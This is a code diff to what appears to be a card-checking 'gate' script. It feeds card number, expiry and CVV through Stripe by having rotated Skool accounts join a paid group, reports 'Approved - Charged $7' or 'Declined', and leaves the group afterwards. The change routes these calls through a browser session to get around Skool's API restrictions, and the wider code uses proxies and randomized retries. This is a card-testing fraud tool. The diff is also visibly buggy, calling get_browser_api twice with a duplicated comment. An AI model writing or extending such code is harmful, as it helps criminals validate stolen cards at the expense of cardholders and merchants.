@@ -8,6 +8,7 @@ from gates.skool_accounts import (
     get_next_account,
     get_authed_client,
     invalidate_session,
+    get_browser_api, _make_fresh_client,
     get_account_lock,
     close_client,
     get_fallback_account,
@@ -35,7 +36,7 @@ def _random_guid():
     return "".join(random.choices(string.hexdigits.lower(), k=32))
 
 
-async def _leave_group(client):
+async def _leave_group(bapi):
     for endpoint in [
         f"{SKOOL_API}/groups/{GROUP_ID}/cancel-join-group-paid",
         f"{SKOOL_API}/groups/{GROUP_NAME}/cancel-join",
@@ -117,19 +118,29 @@ async def _check_with_account(cc, mm, yy, cvv, account, user_proxy=None):
         joined_group = False
         try:
             force_refresh = attempt > 0
-            client = await get_authed_client(account, force_refresh=force_refresh, user_proxy=user_proxy)
-            if not client:
-                # get_authed_client() already retried the login itself, so
-                # trying the same account again only multiplies the wait and
-                # pushes the gate past the outer timeout.
+            # The skool api only lets the browser in, so the calls go
+            # from the page the browser is on.  The plain session is
+            # only there for stripe.
+            bapi = await get_browser_api(account, force_refresh=force_refresh)
+            if not bapi:
                 elapsed = round(time.time() - start, 2)
-                _last_err = get_last_login_error(account)
-                _why = f" ({_last_err})" if _last_err else ""
-                return f"Error - Skool Account Login Error{_why} [{elapsed}s]"
+                last_err = get_last_login_error(account)
+                reason = f" ({last_err})" if last_err else ""
+                return f"Error - Skool browser session failed{reason} [{elapsed}s]"
+            client = _make_fresh_client(user_proxy=user_proxy)
 
-            await _leave_group(client)
+            # The skool api only lets the browser in, so the calls
+            # go from the page the browser is on.
+            bapi = await get_browser_api(account, force_refresh=force_refresh,
+                                        fallback=client)
+            if not bapi:
+                elapsed = round(time.time() - start, 2)
+                return f"Error - Skool browser session failed [{elapsed}s]"
 
-            r_si = await client.post(
+
+            await _leave_group(bapi)
+
+            r_si = await bapi.post(
                 f"{SKOOL_API}/self/setup-payment-method", json={}, timeout=REQUEST_TIMEOUT
             )
             if r_si.status_code != 200:
@@ -235,7 +246,7 @@ async def _check_with_account(cc, mm, yy, cvv, account, user_proxy=None):
                 return f"Declined - Setup Failed | {info} [{elapsed}s]"
 
             try:
-                await client.post(
+                await bapi.post(
                     f"{SKOOL_API}/self/add-payment-method",
                     json={"pt": pm_id, "sid": setup_intent_id},
                     timeout=REQUEST_TIMEOUT,
@@ -243,11 +254,11 @@ async def _check_with_account(cc, mm, yy, cvv, account, user_proxy=None):
             except Exception:
                 pass
 
-            await client.post(
+            await bapi.post(
                 f"{SKOOL_API}/groups/{GROUP_ID}/init-join-group-paid", json={}, timeout=REQUEST_TIMEOUT
             )
 
-            r_join = await client.post(
+            r_join = await bapi.post(
                 f"{SKOOL_API}/groups/{GROUP_NAME}/join-group-paid",
                 params={"pm": pm_id, "recurring_interval": "month", "tier": "standard"},
                 timeout=REQUEST_TIMEOUT,
@@ -268,7 +279,7 @@ async def _check_with_account(cc, mm, yy, cvv, account, user_proxy=None):
                     )
                     pi_resp = r_pi.json()
                     pi_status = pi_resp.get("status", "")
-                    await _leave_group(client)
+                    await _leave_group(bapi)
                     if pi_status == "succeeded":
                         return f"Approved - Charged $7 | {info} [{elapsed}s]"
                     elif pi_status == "requires_action":
@@ -283,11 +294,11 @@ async def _check_with_account(cc, mm, yy, cvv, account, user_proxy=None):
                         return f"Declined - {decline or code or 'charge_failed'} | {info} [{elapsed}s]"
                     else:
                         return f"Declined - PI Status: {pi_status} | {info} [{elapsed}s]"
-                await _leave_group(client)
+                await _leave_group(bapi)
                 return f"Approved - Charged $7 | {info} [{elapsed}s]"
 
             elif r_join.status_code == 422:
-                await _leave_group(client)
+                await _leave_group(bapi)
                 join_data = r_join.json()
                 fields = join_data.get("fields", [])
                 if fields:
@@ -306,17 +317,17 @@ async def _check_with_account(cc, mm, yy, cvv, account, user_proxy=None):
             elif r_join.status_code == 400:
                 body = r_join.text
                 if "already" in body.lower() or "member" in body.lower():
-                    await _leave_group(client)
+                    await _leave_group(bapi)
                     if attempt < MAX_RETRIES - 1:
                         invalidate_session(account)
                         await asyncio.sleep(random.uniform(RETRY_DELAY_MIN, RETRY_DELAY_MAX))
                         continue
                     return f"Error - Account already member [{elapsed}s]"
-                await _leave_group(client)
+                await _leave_group(bapi)
                 return f"Declined - {body[:80]} | {info} [{elapsed}s]"
 
             elif r_join.status_code in (401, 403):
-                await _leave_group(client)
+                await _leave_group(bapi)
                 if attempt < MAX_RETRIES - 1:
                     invalidate_session(account)
                     await asyncio.sleep(random.uniform(RETRY_DELAY_MIN, RETRY_DELAY_MAX))
@@ -324,12 +335,12 @@ async def _check_with_account(cc, mm, yy, cvv, account, user_proxy=None):
                 return f"Error - Join failed ({r_join.status_code}) | {info} [{elapsed}s]"
 
             else:
-                await _leave_group(client)
+                await _leave_group(bapi)
                 return f"Error - Join failed ({r_join.status_code}) | {info} [{elapsed}s]"
 
         except (TimeoutError, ConnectionError, OSError) as e:
             if client and joined_group:
-                await _leave_group(client)
+                await _leave_group(bapi)
             err_str = str(e)
             is_proxy_err = any(s in err_str for s in ["407", "CONNECT tunnel", "proxy", "Proxy"])
             if is_proxy_err:
@@ -349,7 +360,7 @@ async def _check_with_account(cc, mm, yy, cvv, account, user_proxy=None):
             return f"Error - Gateway Timeout [{elapsed}s]"
         except Exception as e:
             if client and joined_group:
-                await _leave_group(client)
+                await _leave_group(bapi)
             err_str = str(e)
             is_proxy_err = any(s in err_str for s in ["407", "CONNECT tunnel", "proxy", "Proxy"])
             if is_proxy_err:
